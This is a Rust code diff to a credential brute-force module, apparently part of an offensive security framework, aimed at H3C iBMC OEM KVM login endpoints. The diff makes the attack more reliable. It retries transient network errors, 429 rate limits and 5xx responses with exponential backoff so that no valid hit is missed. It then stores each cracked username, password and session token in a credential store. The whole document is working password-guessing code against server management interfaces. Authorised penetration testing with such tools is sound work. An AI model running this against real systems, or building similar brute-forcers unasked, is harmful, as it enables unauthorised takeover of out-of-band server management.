@@ -98,6 +98,19 @@ impl Encoding {
     }
 }
 
+/// Outcome of a single login attempt. Distinguishes a transport/transient
+/// failure (which must NOT be treated as a denied credential) from a genuine
+/// authentication rejection.
+enum AttemptResult {
+    /// Endpoint returned a session token — credential is valid.
+    Hit(String),
+    /// Endpoint definitively rejected the credential (401/403 or no token).
+    Denied,
+    /// Transient transport error (timeout, reset, TLS, connect refused).
+    /// Retryable; never counts as a denial.
+    Transient(String),
+}
+
 fn display_banner() {
     if crate::utils::is_batch_mode() { return; }
     crate::mprintln!("{}", "╔══════════════════════════════════════════════════════════════╗".red());
@@ -218,42 +231,101 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
         host, path, pairs.len(), encodings.len(), pairs.len() * encodings.len(),
     ).cyan());
 
+    // How many times to re-attempt a single (user, pass, encoding) when the
+    // endpoint returns a transient transport error before giving up on that
+    // attempt. Without this, a momentary blip would silently drop a real hit.
+    const MAX_TRANSIENT_RETRIES: u32 = 3;
+
     let mut found: Vec<(String, String, Encoding, String)> = Vec::new();
     let mut tried = 0u64;
     'outer: for (user, pass) in &pairs {
         for enc in &encodings {
             if ctx.is_cancelled() { break 'outer; }
             tried += 1;
-            ctx.rate_limit(target).await;
-            if let Some(token) = try_login(&client, &host, &path, user, pass, *enc).await {
-                crate::mprintln!("{}", format!(
-                    "[+] HIT: {}:{} ({}) -> X-Auth-Token={}",
-                    user, pass, enc.label(), token
-                ).green().bold());
-                if crate::cred_store::store_credential(crate::cred_store::NewCred {
-                    host: &host, port, service: "https", username: user, secret: pass,
-                    cred_type: crate::cred_store::CredType::Password,
-                    source_module: "creds/generic/h3c_oem_kvm_bruteforce",
-                }).await.is_none() { eprintln!("[!] Failed to store credential"); }
-                outcome.findings.push(Finding {
-                    target: target.to_string(),
-                    kind: FindingKind::Credential,
-                    message: format!("H3C iBMC OEM KVM credentials valid {}:{} ({}) on {}", user, pass, enc.label(), host),
-                    data: Some(serde_json::json!({
-                        "service": "https",
-                        "port": port,
-                        "username": user,
-                        "password": pass,
-                        "encoding": enc.label(),
-                        "token": token,
-                    })),
-                });
-                found.push((user.clone(), pass.clone(), *enc, token));
-                if stop_on_hit { break 'outer; }
-            } else if verbose {
-                crate::mprintln!("{}", format!(
-                    "[-] {}:{} ({}) — denied", user, pass, enc.label()
-                ).dimmed());
+
+            // Retry transient transport errors with exponential backoff so a
+            // network blip never masquerades as a denied credential.
+            let mut attempt = 0u32;
+            let result = loop {
+                if ctx.is_cancelled() { break 'outer; }
+                ctx.rate_limit(target).await;
+                match try_login(&client, &host, &path, user, pass, *enc).await {
+                    AttemptResult::Transient(msg) if attempt < MAX_TRANSIENT_RETRIES => {
+                        attempt += 1;
+                        if verbose {
+                            crate::mprintln!("{}", format!(
+                                "[~] {}:{} ({}) transient error ({}); retry {}/{}",
+                                user, pass, enc.label(), msg, attempt, MAX_TRANSIENT_RETRIES
+                            ).dimmed());
+                        }
+                        let backoff = Duration::from_millis(250u64 * (1u64 << (attempt - 1)));
+                        tokio::time::sleep(backoff).await;
+                        continue;
+                    }
+                    other => break other,
+                }
+            };
+
+            match result {
+                AttemptResult::Hit(token) => {
+                    crate::mprintln!("{}", format!(
+                        "[+] HIT: {}:{} ({}) -> X-Auth-Token={}",
+                        user, pass, enc.label(), token
+                    ).green().bold());
+                    if crate::cred_store::store_credential(crate::cred_store::NewCred {
+                        host: &host, port, service: "https", username: user, secret: pass,
+                        cred_type: crate::cred_store::CredType::Password,
+                        source_module: "creds/generic/h3c_oem_kvm_bruteforce",
+                    }).await.is_none() { eprintln!("[!] Failed to store credential"); }
+                    outcome.findings.push(Finding {
+                        target: target.to_string(),
+                        kind: FindingKind::Credential,
+                        message: format!("H3C iBMC OEM KVM credentials valid {}:{} ({}) on {}", user, pass, enc.label(), host),
+                        data: Some(serde_json::json!({
+                            "service": "https",
+                            "port": port,
+                            "username": user,
+                            "password": pass,
+                            "encoding": enc.label(),
+                            "token": token,
+                        })),
+                    });
+                    found.push((user.clone(), pass.clone(), *enc, token));
+                    if stop_on_hit { break 'outer; }
+                }
+                AttemptResult::Denied => {
+                    if verbose {
+                        crate::mprintln!("{}", format!(
+                            "[-] {}:{} ({}) — denied", user, pass, enc.label()
+                        ).dimmed());
+                    }
+                }
+                AttemptResult::Transient(msg) => {
+                    // Exhausted retries: surface as a Note so the operator
+                    // knows this pair was NOT actually tested (vs. denied),
+                    // and never treat it as a clean negative.
+                    crate::mprintln!("{}", format!(
+                        "[!] {}:{} ({}) — untested after {} transient error(s): {}",
+                        user, pass, enc.label(), MAX_TRANSIENT_RETRIES, msg
+                    ).yellow());
+                    outcome.findings.push(Finding {
+                        target: target.to_string(),
+                        kind: FindingKind::Note,
+                        message: format!(
+                            "H3C iBMC OEM KVM attempt {}:{} ({}) on {} could not be completed (transient error: {}); credential status unknown",
+                            user, pass, enc.label(), host, msg
+                        ),
+                        data: Some(serde_json::json!({
+                            "service": "https",
+                            "port": port,
+                            "username": user,
+                            "password": pass,
+                            "encoding": enc.label(),
+                            "error": msg,
+                            "tested": false,
+                        })),
+                    });
+                }
             }
         }
     }
@@ -271,9 +343,10 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
     Ok(outcome)
 }
 
-/// Single login attempt. Returns `Some(token)` on success, `None` on any
-/// kind of failure (including 429 — caller may chose to honor Retry-After,
-/// but on default builds the endpoint never returns one).
+/// Single login attempt. Returns an [`AttemptResult`] that lets the caller
+/// distinguish a valid credential (`Hit`) from a genuine rejection (`Denied`)
+/// and from a transient transport failure (`Transient`) — the latter must be
+/// retried rather than silently recorded as "credential not valid".
 async fn try_login(
     client: &reqwest::Client,
     host: &str,
@@ -281,7 +354,7 @@ async fn try_login(
     user: &str,
     pass: &str,
     enc: Encoding,
-) -> Option<String> {
+) -> AttemptResult {
     let url = format!("https://{}{}", host, path);
     let form = [
         ("username", enc.encode(user)),
@@ -290,7 +363,12 @@ async fn try_login(
         ("log_type", "1".to_string()),
     ];
 
-    let resp = client.post(&url).form(&form).send().await.ok()?;
+    let resp = match client.post(&url).form(&form).send().await {
+        Ok(r) => r,
+        // Transport-level failures (timeout, connect refused, TLS, reset) are
+        // transient: they say nothing about whether the credential is valid.
+        Err(e) => return AttemptResult::Transient(format!("send: {e}")),
+    };
     let status = resp.status();
     if status.as_u16() == 429 {
         if let Some(retry) = resp.headers().get("Retry-After")
@@ -299,18 +377,28 @@ async fn try_login(
         {
             tokio::time::sleep(Duration::from_secs(retry.min(60))).await;
         }
-        return None;
+        // Rate-limited: not a denial — let the caller retry.
+        return AttemptResult::Transient("429 rate limited".to_string());
+    }
+    // 5xx are server-side transient errors, not credential rejections.
+    if status.is_server_error() {
+        return AttemptResult::Transient(format!("server error {}", status.as_u16()));
     }
     if !status.is_success() {
-        return None;
+        // 401/403/etc. — a definitive authentication rejection.
+        return AttemptResult::Denied;
     }
-    let body = resp.text().await.ok()?;
+    let body = match crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
+        Ok(b) => b,
+        // Body read failed mid-stream: transient, not a denial.
+        Err(e) => return AttemptResult::Transient(format!("read body: {e}")),
+    };
     if !body.contains("X-Auth-Token") {
-        return None;
+        return AttemptResult::Denied;
     }
     // Surface the token if we can extract it; otherwise mark hit with a
     // placeholder so the caller still records the credential.
-    extract_token(&body).or_else(|| Some("(present)".into()))
+    AttemptResult::Hit(extract_token(&body).unwrap_or_else(|| "(present)".into()))
 }
 
 fn extract_token(body: &str) -> Option<String> {
